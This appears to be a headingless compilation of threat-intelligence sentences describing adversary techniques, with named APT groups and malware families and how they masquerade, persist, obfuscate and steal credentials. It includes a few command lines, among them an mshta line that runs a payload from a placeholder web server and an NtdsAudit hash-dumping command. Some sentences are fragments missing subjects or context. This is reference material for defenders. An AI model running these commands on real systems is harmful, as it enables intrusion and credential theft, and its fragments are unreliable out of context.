APT12 has attempted to get victims to open malicious Microsoft Word and PDF attachment sent via spearphishing.
admin@338 has attempted to get victims to launch malicious Microsoft Word attachments delivered via spearphishing emails.
Frankenstein has used trojanized Microsoft Word documents sent via email, which prompted the victim to enable macros.
Naikon has convinced victims to open malicious attachments to execute malware.
APT33 has used malicious e-mail attachments to lure victims into executing malware.
Sidewinder has lured targets to click on malicious files to gain execution in the target environment.
Tonto Team has relied on user interaction to open their spearphishing attachments.
Indrik Spider has attempted to get users to click on a malicious zipped file.
Adversaries may rely on a user running a malicious image to facilitate execution.

Backdoored images may be uploaded to a public repository via Upload Malware, and users may then download and deploy an instance or container from the image without realizing the image is malicious, thus bypassing techniques that specifically achieve Initial Access.
This can lead to the execution of malicious code, such as code that executes cryptocurrency mining, in the instance or container.
TeamTNT relies on users to download and execute malicious Docker images.
Melcoz has gained execution through victims opening malicious links.
Grandoreiro has used malicious links to gain execution on victim machines.
NETWIRE has been executed through convincing victims into clicking malicious links.
Kerrdown has gained execution through victims opening malicious links.
AppleJeus's spearphishing links required user interaction to navigate to the malicious website.
SMOKEDHAM has relied upon users clicking on a malicious link delivered through phishing.
Cobalt Group has sent emails containing malicious links that require users to execute a file or macro to infect the victim machine.
Machete has has relied on users opening malicious links delivered through spearphishing to execute malware.
Sandworm Team has tricked unwitting recipients into clicking on malicious hyperlinks within emails crafted to resemble trustworthy senders.
Magic Hound has attempted to lure victims into opening malicious links embedded in emails.
Adversaries may develop malware to support their operations, creating a means for maintaining control of remote machines, evading defenses, and executing post-compromise behaviors.
Night Dragon used privately developed and customized remote access tools.
Sandworm Team has developed malware for its operations, including malicious mobile applications and destructive malware such as NotPetya and Olympic Destroyer.
Malicious software can include payloads, droppers, post-compromise tools, backdoors, packers, and C2 protocols.
In addition to downloading free malware from the internet, adversaries may purchase these capabilities from third-party entities.
Adversaries may attempt to manipulate the name of a task or service to make it appear legitimate or benign.
Many benign tasks and services exist that have commonly associated names.
Tasks or services contain other fields, such as a description, that adversaries may attempt to make appear legitimate.
Nidiran can create a new service named msamger , which mimics the legitimate Microsoft database by the same name.
InvisiMole has attempted to disguise itself by registering under a seemingly legitimate service name.
SLOTHFULMEDIA has named a service it establishes on victim machines as "TaskFrame" to hide its malicious purpose.
Crutch has established persistence with a scheduled task impersonating the Outlook item finder.
Hildegard has disguised itself as a known Linux process.
FIN7 has created a scheduled task named “AdobeFlashSync” to establish persistence.
FIN6 has renamed the "psexec" service name to "mstdc" to masquerade as a legitimate Windows service.
APT32 has also impersonated the legitimate Flash installer file name "install_flashplayer.exe".
Carbanak has copied legitimate service names to use for malicious services.
It has also used common document file names for other malware binaries.
Kimsuky has disguised services to appear as benign software or related to operating system functions.
APT41 has created services to appear as benign system tools.
WindTail has used icons mimicking MS Office files to mask payloads.
yty contains several references to football  in a likely attempt to disguise its traffic.
Dragonfly 2.0 created accounts disguised as legitimate backup and service accounts as well as an email administration account.
BRONZE BUTLER has masked executables with document file icons including Word and Adobe PDF.
UNC2452 set the hostnames of its C2 infrastructure to match legitimate hostnames in the victim environment.
Adversaries may match or approximate the name or location of legitimate files or resources when naming/placing them.
This is done for the sake of evading defenses and observation.
If installing itself as a service fails, Elise instead writes itself as a file named svchost.exe saved in %APPDATA%\Microsoft\Network.
A Winnti for Windows implant file was named ASPNET_FILTER.DLL, mimicking the legitimate ASP.NET ISAPI filter DLL with the same name.

OwaAuth uses the filename owaauth.dll, which is a legitimate file that normally resides in %ProgramFiles%\Microsoft\Exchange Server\ClientAccess\Owa\Auth\; the malicious file by the same name is saved in %ProgramFiles%\Microsoft\Exchange Server\ClientAccess\Owa\bin\.
Starloader has masqueraded as legitimate software update packages such as Adobe Acrobat Reader and Intel.
OSX/Shlayer can masquerade as a Flash Player update.
RDAT has masqueraded as VMware.exe.
PipeMon modules are stored on disk with seemingly benign names including use of a file extension associated with a popular word processor.
One of Dtrack can hide in replicas of legitimate programs like OllyDbg, 7-Zip, and FileZilla.
Sibot has downloaded a DLL to the C:\windows\system32\drivers\ folder and renamed it with a .sys extension.
MarkiRAT can masquerade as update.exe and svehost.exe; it has also mimicked legitimate Telegram and Chrome files.
BRONZE BUTLER has given malware the same name as an existing file on the file share server to cause users to unwittingly launch and install the malware on additional systems.
They have also dropped QuasarRAT binaries as files named microsoft_network.exe and crome.exe.
Sowbug named its tools to masquerade as Windows or Adobe Reader software, such as by using the file name adobecms.exe and the directory CSIDL_APPDATA\microsoft\security.
menuPass has been seen changing malicious files to appear legitimate.
APT41 attempted to masquerade their files as popular anti-virus software.
APT39 has used malware disguised as Mozilla Firefox and a tool named mfevtpse.exe to proxy C2 communications, closely mimicking a legitimate McAfee file mfevtps.exe.
PROMETHIUM has disguised malicious installer files by bundling them with legitimate software installers.
Machete's Machete MSI installer has masqueraded as a legitimate Adobe Acrobat Reader installer.

The authentication process is handled by mechanisms, such as the Local Security Authentication Server  process and the Security Accounts Manager  on Windows, pluggable authentication modules  on Unix-based systems, and authorization plugins on MacOS systems, responsible for gathering, storing, and validating credentials.

Compromised credentials or access may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop.
A modification to the compute service infrastructure can include the creation, deletion, or modification of one or more components such as compute instances, virtual machines, and snapshots.
The built-in Windows command-line utility Reg may be used for local or remote Registry modification.
Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence.
Often Valid Accounts are required, along with access to the remote system's SMB/Windows Admin Shares for RPC communication.
PLAINTEE uses reg add to add a Registry Run key for persistence.
ADVSTORESHELL is capable of setting and deleting Registry values.
Volgmer stores the encoded configuration file in the Registry key HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\WMI\Security.
Mosquito stores configuration values under the Registry key HKCU\Software\Microsoft\dllname and modifies Registry keys under HKCR\CLSID\...\InprocServer32with a path to the launcher.

DarkComet adds a Registry value for its installation routine to the Registry Key HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System Enable LUA=”0” and HKEY_CURRENT_USER\Software\DC3_FEXEC.

It will then connect to the system with RegConnectRegistryW and modify the Registry to disable UAC remote restrictions by setting SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy to 1.
HOPLIGHT has modified Managed Object Format  files within the Registry to run specific commands and create persistence on the system.
TajMahal can set the KeepPrintedJobs attribute for configured printers in SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Print\\Printers to enable document stealing.
gh0st RAT has altered the InstallTime subkey.
Pillowmint has stored its malicious payload in the registry key HKLM\SOFTWARE\Microsoft\DRM.
PipeMon has stored its encrypted payload in the Registry.
SLOTHFULMEDIA can add, modify, and/or delete registry keys.
It has changed the proxy configuration of a victim system by modifying the HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap registry.
HyperStack can add the name of its communication pipe to HKLM\SYSTEM\\CurrentControlSet\\Services\\lanmanserver\\parameters\NullSessionPipes.
Conficker adds keys to the Registry at HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services and various other Registry locations.
Clop can make modifications to Registry keys.
Lokibot has modified the Registry as part of its UAC bypass process.
Dragonfly 2.0 modified the Registry to perform multiple techniques through the use of Reg.
APT19 uses a Port 22 malware variant to modify several Registry keys.
A Patchwork payload deletes Resiliency Registry keys created by Microsoft Office applications in an apparent effort to trick users into thinking there were no issues during application runs.
To change the operating system, the adversary typically only needs to affect this one file, replacing or modifying it.
HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser.

Files may be executed by mshta.exe through an inline script: mshta vbscript:Close"
They may also be executed directly from URLs: mshta http://webserver/payload.hta
Mshta.exe can be used to bypass application control solutions that do not account for its potential use.
NanHaiShu uses mshta.exe to load its program and files.
POWERSTATS can use Mshta.exe to execute additional payloads on compromised hosts.
Xbash can use mshta for executing scripts.
MuddyWater has used mshta.exe to execute its POWERSTATS payload and to pass a PowerShell one-liner for execution.
Sidewinder has used mshta.exe to execute malicious payloads.
Mustang Panda has used mshta.exe to launch collection scripts.
Adversaries may abuse msiexec.exe to launch local or network accessible MSI files.
Duqu has used msiexec to execute malicious Windows Installer packages.
Maze has delivered components for its ransomware attacks using MSI files, some of which have been executed from the command-line using msiexec.
QakBot can use MSIExec to spawn multiple cmd.exe processes.
Remote access tools will call back to the first-stage command and control server for instructions.
The first stage may have automated capabilities to collect basic host information, update tools, and upload additional files.
After initial compromise, Chaos will download a second stage to establish a more permanent presence on the affected system.
To disguise the source of malicious traffic, adversaries may chain together multiple proxies.
This technique makes identifying the original source of the malicious traffic even more difficult by requiring the defender to trace malicious traffic through several proxies to identify its source.
Protocols such as ICMP may be used as a transport.
Dok downloads and installs Tor via homebrew.
GreyEnergy has used Tor relays for Command and Control servers.
MacSpy uses Tor for command and control.
WannaCry uses Tor for command and control traffic.
Ursnif has used Tor for C2.
StrongPity can use multiple layers of proxy servers to hide terminal nodes in its infrastructure.

Adversaries may attempt to access or create a copy of the Active Directory domain database in order to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights.

Chimera specifically has used the NtdsAudit tool to dump the password hashes of domain users via cmsadcs.exe "NTDS.dit" -s "SYSTEM" -p RecordedTV_pdmp.txt --users-csv RecordedTV_users.csv and used ntdsutil to copy the Active Directory database.
APT28 has used the ntdsutil.exe utility to export the Active Directory database for credential access.
The Regin malware platform uses Extended Attributes to store encrypted executables.
BitPaymer has copied itself to the :bin alternate data stream of a newly created file.
Adversaries may abuse these OS API functions as a means of executing behaviors.
Similar to Command and Scripting Interpreter, the native API and its hierarchy of interfaces provide mechanisms to interact with and utilize various components of a victimized system.
ADVSTORESHELL is capable of starting a process using CreateProcess.
Volgmer executes payloads using the Windows API call CreateProcessW.
LightNeuron is capable of starting a process using CreateProcess.
HotCroissant can perform dynamic DLL importing and API lookups using LoadLibrary and GetProcAddress on obfuscated strings.
Rising Sun used dynamic API resolutions to various Windows APIs by leveraging LoadLibrary and GetProcAddress.
build_downer has the ability to use the WinExec API to execute malware on a compromised host.
Denis used the IsDebuggerPresent, OutputDebugString, and SetLastError APIs to avoid debugging.
WindTail can invoke Apple APIs contentsOfDirectoryAtPath, pathExtension, and  compare.
Hancitor has used CallWindowProc and EnumResourceTypesA to interpret and execute shellcode.
PipeMon's first stage has been executed by a call to CreateProcess with the decryption password in an argument.
PipeMon has used a call to LoadLibrary to load its installer.
FatDuke can call ShellExecuteW to open the default browser on the URL localhost.
Stuxnet uses the SetSecurityDescriptorDacl API to reduce object integrity levels.
EvilBunny has used various API calls as part of its checks to see if the malware is running in a sandbox.
SombRAT has the ability to respawn itself using ShellExecuteW and CreateProcessW.
Siloscape makes various native API calls.
MarkiRAT can run the ShellExecuteW API via the Windows Command Shell.
SideTwist can use GetUserNameW, GetComputerNameW, and GetComputerNameExW to gather information.
Silence has leveraged the Windows API, including using CreateProcess or ShellExecute, to perform a variety of tasks.
Turla and its RPC backdoors have used APIs calls for various tasks related to subverting AMSI and accessing then executing commands through RPC and/or named pipes.
Gamaredon Group malware has used CreateProcess to launch additional malicious components.
When performing NAT, the network device will rewrite the source and/or destination addresses of the IP address header.
Some network designs require NAT for the packets to cross the border device.
Devices such as routers and firewalls can be used to create boundaries between trusted and untrusted networks.

By achieving sufficient rights on the device, an adversary can reconfigure the device to allow the traffic they want, allowing them to then further achieve goals such as command and control via Multi-hop Proxy or exfiltration of data via Traffic Duplication.
Adversaries may perform Network Denial of Service  attacks to degrade or block the availability of targeted resources to users.
The device typically stores an in-memory copy of the configuration while operating, and a separate configuration on non-volatile storage to load after device reset.
Depending on the systems within the network, initializing one of these scripts could apply to more than one or potentially all systems.
Adversaries may gather information about the victim's network security appliances that can be used during targeting.
HDoor scans to identify open ports on the victim.
Remsec has a plugin that can perform ARP scanning as well as port scanning.
Ramsay can scan for systems that are vulnerable to the EternalBlue exploit.
Caterpillar WebShell has a module to use a port scanner on a system.
Conficker scans for other machines to infect.
Cobalt Group leveraged an open-source tool called SoftPerfect Network Scanner to perform network scanning.
FIN6 used publicly available tools  to map the internal network and conduct reconnaissance against Active Directory, Structured Query Language  servers, and NetBIOS.
Tropic Trooper used pr and an openly available tool to scan for open ports on target systems.
Fox Kitten has used tools including NMAP to conduct broad scanning to identify open ports.
Adversaries may remove share connections that are no longer useful in order to clean up traces of their operation.
Windows shared drive and SMB/Windows Admin Shares connections can be removed when no longer needed.
Threat Group-3390 has detached network shares after exfiltrating files, likely to evade detection.

Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement.
Net can be used to query a remote system for available shared drives using the net view \\\\remotesystem command.
InvisiMole can gather network share information.
OSInfo discovers shares on the network PlugX has a module to enumerate network shares.
Clop can enumerate network shares.
DEATHRANSOM has the ability to use loop operations to enumerate network resources.
Babuk has the ability to enumerate network shares.
WastedLocker can identify network adjacent and accessible drives.
Sowbug listed remote shared drives that were accessible from a victim.
Data captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol.
Regin appears to have functionality to sniff for credentials passed over HTTP, SMTP, and SMB.
It continues parsing protocol layers including SCTP, SCCP, and TCAP and finally extracts SMS message data and routing metadata.
Kimsuky has used the Nirsoft SniffPass network sniffer to obtain passwords sent over non-secure protocols.
This information may also include specifics regarding network devices  and other infrastructure.
Some variants of FakeM use SSL to communicate with C2 servers.
BUBBLEWRAP can communicate using SOCKS.
Mis-Type network traffic can communicate over a raw socket.
The Regin malware platform can use ICMP to communicate between infected computers.
MoonWind completes network communication via raw sockets.
TSCookie can use ICMP to receive information on the destination server.
Aria-body has used TCP in C2 communications.
Anchor has used ICMP in C2 communications.
Pay2Key has sent its public key to the C2 server over TCP.
Bandook has a command built in to use a raw TCP socket.
BackdoorDiplomacy has used EarthWorm for network tunneling with a SOCKS5 server and port transfer functionalities.
Adversaries may encode data with a non-standard data encoding system to make the content of command and control traffic more difficult to detect.
Bankshot encodes commands from the control server using a range of characters and gzip.
InvisiMole can use a modified base32 encoding to encode data within the subdomain of C2 requests.
For example, HTTPS over port 8088 or port 587 as opposed to the traditional port 443.
Some TrickBot samples have used HTTP over ports 447 and 8082 for C2.
StrongPity has used HTTPS over port 1402 in C2 communication.
FIN7 has used port-protocol mismatches on ports such as 53, 80, 443, and 8080 during C2.
Some Lazarus Group malware uses a list of ordered port numbers to choose a port for C2 traffic, creating port-protocol mismatches.
APT-C-36 has used port 4050 for C2 communications.
Silence has used port 444 when sending data about the system from the client to the server.
Suckfly used a signed credential-dumping tool to obtain victim account credentials.
Frankenstein has harvested credentials from the victim's machine using Empire.
Adversaries may target the operating system  for a DoS attack, since the  is responsible for managing the finite resources on a system.
This greatly reduces the resources available for providing the targeted service.
Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit.
Most of the strings in ADVSTORESHELL are encrypted with an XOR-based algorithm; some strings are also encrypted with 3DES and reversed.
The Helminth config file is encrypted with RC4.
FELIXROOT encrypts strings in the backdoor using a custom XOR algorithm.
InvisiMole avoids analysis by encrypting all strings, internal files, configuration data and by using a custom executable format.
Agent Tesla has had its code obfuscated in an apparent attempt to make analysis difficult.
Cardinal RAT encodes many of its artifacts and is encrypted  when downloaded.
Additionally, backdoor files are encrypted using DES as a stream cipher.
UBoatRAT encrypts instructions in the payload using a simple XOR cipher.
A Volgmer variant is encoded using a simple XOR cipher.
Final1stspy obfuscates strings with base64 encoding.
DOGCALL is encrypted using single-byte XOR.
APIs and strings in some TYPEFRAME variants are RC4 encrypted.
Shamoon contains base64-encoded strings.
It also uses a one-byte xor against 0x91 to encode configuration data.
ZeroT has encrypted its payload with RC4.
The malware also uses return-oriented programming  technique and single-byte XOR to obfuscate data.
GreyEnergy encrypts its configuration files with AES-256 and also encrypts its strings.
SamSam has been seen using AES or DES to encrypt payloads and payload components.
Astaroth obfuscates its JScript code, and has used an XOR-based algorithm to encrypt payloads twice with different keys.
SpeakUp encodes its second-stage payload with Base64.
StoneDrill has obfuscated its module with an alphabet-based table or XOR encryption.
Ursnif droppers have also been delivered as password-protected zip files that execute base64 encoded PowerShell commands.
Exaramel for Linux uses RC4 for encrypting the configuration.
Machete has also used some visual obfuscation techniques by naming variables as combinations of letters to hinder analysis.
SHARPSTATS has used base64 encoding and XOR to obfuscate PowerShell scripts.
Metamorfo has encrypted payloads and strings.
Ramsay can also embed information within document footers.
SDBbot has the ability to XOR the strings for its installer component with a hardcoded 128 byte key.
CARROTBAT has the ability to download a base64 encoded payload and execute obfuscated commands on the infected host.
TajMahal has used an encrypted Virtual File System to store plugins.
Valak has the ability to base64 encode and XOR encrypt strings.
ComRAT has also embedded an XOR encrypted communications module inside the orchestrator module.
Bundlore has obfuscated data with base64, AES, RC4, and bz2.
GoldenSpy's uninstaller has base64-encoded its variables.
Pillowmint has been compressed and stored within a registry key.
StrongPity has used encrypted strings in its dropper component.
SUNBURST strings were compressed and encoded in Base64.
SUNBURST also obfuscated collected system information using a FNV-1a + XOR algorithm.
SUNSPOT encrypted log entries it collected with the stream cipher RC4 using a hard-coded key.
Raindrop encrypted its payload using a simple XOR algorithm with a single-byte key.
Dtrack has used a dropper that embeds an encrypted payload as extra data.
More_eggs's payload has been encrypted with a key that has the hostname and processor family information appended to the end.
AppleJeus has XOR-encrypted collected system information prior to sending to a C2.
Sibot has obfuscated scripts used in execution.
Conficker has obfuscated its code to prevent its removal from host machines.
Siloscape itself is obfuscated and uses obfuscated API calls.
Taidoor can use encrypted string blocks for obfuscation.
Turian can use VMProtect for obfuscation.
QakBot can use obfuscated and encoded scripts; it has also hidden code within Excel spreadsheets by turning the font color to white and splitting it across multiple cells.
PowerDuke uses steganography to hide backdoors in PNG files, which are also encrypted using the Tiny Encryption Algorithm .
Exaramel uses RC4 for encrypting the configuration.
BlackOasis's first stage shellcode contains a NOP sled with alternative instructions that was likely designed to bypass antivirus tools.
menuPass has encoded strings in its malware with base64 as well as with a simple, single-byte XOR obfuscation using key 0x40.
Patchwork has obfuscated a script with Crypto Obfuscator.
Leviathan has obfuscated code using base64 and gzip compression.
APT32 also encrypts the library used for network exfiltration with AES-256 in CBC mode in their macOS backdoor.
A Threat Group-3390 tool can encrypt payloads using XOR.
Magic Hound malware has used base64-encoded commands and files, and has also encrypted embedded strings with AES.
APT28 has also obfuscated payloads with base64, XOR, and RC4.
Tropic Trooper has encrypted configuration files.
APT29 has used encoded PowerShell commands.
Inception has encrypted malware payloads dropped on victim machines with AES and RC4 encryption.
Frankenstein has run encoded commands from the command line.
Whitefly has encrypted the payload used for C2.
Chimera has encoded PowerShell commands.
Operation Wocao has executed PowerShell commands which were encoded or compressed using Base64, zlib, and XOR.
Fox Kitten has base64 encoded scripts and payloads to avoid detection.
TA551 has used obfuscated variable names in a JavaScript configuration file.
Mustang Panda has delivered initial payloads hidden using archives and encoding measures.
Transparent Tribe has dropped encoded executables on compromised hosts.
Adversaries may buy and/or steal capabilities that can be used during targeting.
Adversaries may abuse Microsoft Office templates to obtain persistence on a compromised system.
The base templates within the application are used each time an application starts.
By default, Word has a Normal.dotm template created that can be modified to include a malicious macro.
MuddyWater has used a Word Template, Normal.dotm, for persistence.
Adversaries may abuse the Microsoft Office "Office Test" Registry key to obtain persistence on a compromised system.
An Office Test Registry location exists that allows a user to specify an arbitrary DLL that will be executed every time an Office application is started.
EVILNUM has used a one-way communication method via GitLab and Digital Point to perform C2.
This feature allows for an internal or external URL to be loaded and presented whenever a folder is opened.
Outlook rules allow a user to define automated behavior to manage email messages.
A benign rule might, for example, automatically move an email to a particular folder in Outlook if it contains specific words from a specific sender.
Malicious rules will execute when an adversary sends a specifically crafted email to the user.

For example, an adversary in a privileged user context  administrator may spawn a new process and assign the parent as a process running as SYSTEM , causing the new process to be elevated via the inherited access token.
Adversaries may “pass the hash” using stolen password hashes to move laterally within an environment, bypassing normal system access controls.
When performing PtH, valid password hashes for the account being used are captured using a Credential Access technique.
Once authenticated, PtH may be used to perform actions on local or remote systems.
HOPLIGHT has been observed loading several APIs associated with Pass the Hash.
The APT1 group is known to have used pass the hash.
Kerberos authentication can be used as the first step to lateral movement to a remote system.
APT32 successfully gained remote access by using pass the ticket.
The resulting plaintext password resulting from a successfully cracked hash may be used to log into systems, resources, and services in which the account has access.
APT41 performed password brute-force attacks on the local admin account.
Filters are implemented as DLLs containing a method to validate potential passwords against password policies.
Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism.
SpeakUp can perform brute forcing using a pre-defined list of usernames and passwords in an attempt to log in to administrative panels.
Pony has used a small dictionary of common passwords against a collected list of local accounts.
Webshell can use predefined users and passwords to execute brute force attacks against SSH, FTP, POP3, MySQL, MSSQL, and PostgreSQL services.
These databases can be stored as files on disk.
MarkiRAT can gather information from the Keepass password manager.
Password policies can be discovered in cloud environments using available APIs such as GetAccountPasswordPolicy in AWS .
APT34 has used net.exe in a script with net accounts /domain to find the password policy of a domain.
Adversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials.
APT28 has also used a Kubernetes cluster to conduct distributed, large-scale password spray attacks.
Silent Librarian has used collected lists of names and e-mail accounts to use in password spraying attacks against private sector targets.
Some network devices are built with a monolithic architecture, where the entire operating system and most of the functionality of the device is contained within a single file.
Examples of existing defenses that can be impeded include encryption, via Weaken Encryption, authentication, via Network Device Authentication, and perimeter defenses, via Network Boundary Bridging.
When the operating system is patched in storage, this can be achieved in either the resident storage  or via TFTP Boot.
However, live memory modification of the operating system can be combined with ROMMONkit to achieve persistence.

Adversaries may place a program in an earlier entry in the list of directories stored in the PATH environment variable, which Windows will then execute when it searches sequentially through that PATH listing in search of the binary that was called from a script or the command line.
Adversaries may execute their own malicious payloads by hijacking the search order used to load other programs.
Unlike DLL Search Order Hijacking, the search order differs depending on the method that is used to execute the program.

In addition, if an adversary places a program called "net.com" in the same directory as "net.exe", then cmd.exe /C net user will execute "net.com" instead of "net.exe" due to the order of executable extensions defined under PATHEXT.
For example, if the path in a shortcut is C:\program files\myapp.exe, an adversary may create a program at C:\program.exe that will be run instead of the intended program.
This technique can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.
The information may be used to enhance their awareness of the system and network environment or may be used for further actions.
A module in Prikormka collects information on available printers and disk drives.
njRAT will attempt to detect if the victim system has a camera during the initial infection.
Attor has a plugin that collects information about inserted storage devices, modems, and phone devices.
Ragnar Locker may attempt to connect to removable drives and mapped network drives.
Stuxnet enumerates removable drives for infection.
QakBot can identify peripheral devices on targeted systems.
APT28 uses a module to receive a notification every time a USB mass storage device is inserted into a victim.
Gamaredon Group has also used malware to scan for removable drives.
This information can help adversaries determine which user accounts and groups are available, the membership of users in particular groups, and which users and groups have elevated permissions.
Adversaries may send phishing messages to gain access to victim systems.
Phishing for information is different from Phishing in that the objective is gathering data from the victim rather than executing malicious code.
More generally, adversaries can conduct non-targeted phishing, such as in mass credential harvesting campaigns.

Through modifying plist files in these locations, adversaries can also execute a malicious dynamic library  by adding a dictionary containing the DYLD_INSERT_LIBRARIES key combined with a path to a malicious dylib under the EnvironmentVariables key in a plist file.
Persistence can also be achieved by modifying the LSEnvironment key in the application's Info.plist file.
PAM is a modular system of configuration files, libraries, and executable files which guide authentication for many services.
PAM components, such as pam_unix.so, can be patched to accept arbitrary adversary supplied values as legitimate credentials.
Adversaries may use port knocking to hide open ports used for persistence or command and control.
The observation of the signal packets to trigger the communication can be conducted through different methods.

The Registry key contains entries for the following:
* Local Port
* Standard TCP/IP Port
* USB Monitor
* WSD Port
Adversaries can use this technique to load malicious code at startup that will persist on system reboot and execute as SYSTEM.
Adversaries may inject portable executables  into processes in order to evade process-based defenses as well as possibly elevate privileges.
Zeus Panda checks processes on the system and if they meet the necessary requirements, it injects into that process.
Gorgon Group malware can download a remote access tool, ShiftyBug, and inject into another process.
Examples include the Start-Process cmdlet which can be used to run an executable and the Invoke-Command cmdlet which runs a command locally or on a remote computer .
A number of PowerShell-based offensive testing tools are available, including Empire,  PowerSploit, PoshC2, and PSAttack.
SeaDuke uses a module to execute Mimikatz with PowerShell to perform Pass the Ticket.
There is a variant of RATANKBA that uses a PowerShell script instead of the traditional PE form.
Emotet has used Powershell to retrieve the malicious payload and download additional resources like Mimikatz.
Revenge RAT uses the PowerShell command Reflection.Assembly to load itself into memory to aid in execution.
OSX_OCEANLOTUS.D uses PowerShell scripts.
ServHelper has the ability to execute a PowerShell script to get information from the infected host.
Denis has a version written in PowerShell.
This technique does not write any data to disk.
Cobalt Strike can also use PowerSploit and other scripting frameworks to perform execution.
TrickBot has been known to use PowerShell to download new payloads, open documents, and upload data to command and control servers.
QakBot can use PowerShell to download and execute payloads.
Turla has used PowerShell to execute commands/scripts, in some cases via a custom executable or code from Empire's PSInject.
APT29 also used PowerShell to create new tasks on remote machines, identify configuration settings, evade defenses, exfiltrate data, and to execute other commands.
Threat Group-3390 has used PowerShell for execution.
Stealth Falcon malware uses PowerShell commands to perform various functions, including gathering system information via WMI and executing commands from its C2 server.
APT28 downloads and executes PowerShell scripts and performs PowerShell commands.
OilRig has used PowerShell scripts for execution, including use of a macro to run a PowerShell command to decode file contents.
TA459 has used PowerShell for execution of a payload.
FIN8 has also used PowerShell for lateral movement and credential access.
TEMP.Veles has used a publicly-available PowerShell-based tool, WMImplant.
APT41 leveraged PowerShell to deploy malware families in victims’ environments.
It has also used PowerShell to execute commands and move laterally through a victim network.
Blue Mockingbird has used PowerShell reverse TCP shells to issue interactive commands over a network connection.
UNC2452 used PowerShell to create new tasks on remote machines, identify configuration settings, exfiltrate data, and to execute other commands.
Sidewinder has used PowerShell to drop and execute malware loaders.
Tonto Team has used PowerShell to download additional payloads.
Nomadic Octopus has used PowerShell for execution.
Adversaries may abuse Pre-OS Boot mechanisms as a way to establish persistence on a system.
This can be particularly difficult to detect as malware at this level will not be detected by host software-based defenses.
The PipeMon installer has modified the Registry key HKLM\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows x64\Print Processors to install PipeMon as a Print Processor.
Private cryptographic keys and certificates are used for authentication, encryption/decryption, and digital signatures.
UNC2452 obtained the private encryption key from an Active Directory Federation Services  container to decrypt corresponding SAML signing certificates.
Processes running with root privileges can use this facility to scrape live memory of other running programs.
Once enumerated, the target processes’ memory map within /proc/pid/maps can be overwritten using dd.
In Mac and Linux, this is accomplished with the ps command.
JPIN can list running processes.
InvisiMole can obtain a list of running processes.
Mosquito runs tasklist to obtain running processes.
KEYMARBLE can obtain a list of running processes on the system.
iKitten lists the current processes running.
NavRAT uses tasklist /v to check running processes.
FruitFly has the ability to list processes on the system.
SynAck enumerates all running processes.
Agent Tesla can list the current running processes on the system.
XAgentOSX contains the getProcessList function to run ps aux to get running processes.
ChChes collects its process identifier  on the victim.
HALFBAKED can obtain information about running processes on the victim.
StreamEx has the ability to enumerate processes.
MoonWind has a command to return a list of running processes.
yty gets an output of running processes using the tasklist command.
FELIXROOT collects a list of running processes.
FinFisher checks its parent process for indications that it is running in a sandbox setup.
Brave Prince lists the running processes.
4H RAT has the capability to obtain a listing of running processes .
Emotet has been observed enumerating local processes.
PowerStallion has been used to monitor process lists.
KONNI has used tasklist.exe to get a snapshot of the current processes’ state of the target machine.
Rising Sun can enumerate all running processes and process information on an infected machine.
TajMahal has the ability to identify running processes and associated plugins on an infected host.
Bonadan can use the ps command to discover other cryptocurrency miners active on the system.
Cobalt Strike's Beacon payload can collect information on process details.
Javali can monitor processes for open browsers and custom banking applications.
EKANS looks for processes from a hard-coded list.
Doki has searched for the current process’s PID.
P8RAT can check for specific processes associated with virtual environments.
Nebulae can enumerate processes on a target system.
Taidoor can use GetCurrentProcessId for process discovery.
Cobalt Strike's "beacon" payload can collect information on process details.
After compromising a victim, Poseidon Group lists all running processes.
Turla RPC backdoors have also enumerated processes associated with specific open ports or named pipes.
Several Lazarus Group malware families gather a list of running processes on a victim system and send it to their C2 server.
A Destover-like variant used by Lazarus Group also gathers process times.
Stealth Falcon malware gathers a list of running processes.
MuddyWater has used malware to obtain a list of running processes on the system.
UNC2452 used multiple command-line utilities to enumerate running processes.
APT29 has used multiple command-line utilities to enumerate running processes.
Adversaries may inject malicious code into process via process doppelgänging in order to evade process-based defenses as well as possibly elevate privileges.
Until the write handle transaction is terminated, all other handles are isolated from the writer and may only read the committed version of the file that existed at the time the handle was opened.
Although deprecated, the TxF application programming interface  is still enabled as of Windows 10.
This behavior will likely not result in elevated privileges since the injected process was spawned from  of the injecting process.
Process hollowing is commonly performed by creating a process in a suspended state then unmapping/hollowing its memory, which can then be replaced with malicious code.
A victim process can be created with native Windows API calls such as CreateProcess, which includes a flag to suspend the processes primary thread.
BBSRAT has been seen loaded into msiexec.exe through process hollowing to hide its execution.
ISMInjector hollows out a newly created process RegASM.exe and injects its payload into the hollowed process.
Bazar can inject into a target process including Svchost, Explorer, and cmd using process hollowing.
The NETWIRE payload has been injected into benign Microsoft executables via process hollowing.
Gorgon Group malware can use process hollowing to inject one of its trojans into another process.
Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process.
These implementations exist for every major OS but are typically platform specific.
JHUHUGIT performs code injection injecting its own functions to browser processes.
AuditCred can inject code from files to other running processes.
Agent Tesla can inject into known, vulnerable binaries on targeted hosts.
GuLoader has the ability to inject shellcode into a donor processes that is started in a suspended state.
TrickBot has used Nt* Native API functions to inject code into legitimate processes such as wermgr.exe.
injects a malicious DLL into the IExplorer.exe process.
PLATINUM has used various methods of process injection including hot patching.
Honeybee uses a batch file to load a DLL into the svchost.exe process.
Sharpshooter has leveraged embedded shellcode to inject a downloader into the memory of Word.
Operation Wocao has injected code into a selected process, which in turn launches a command as a child process of the original.
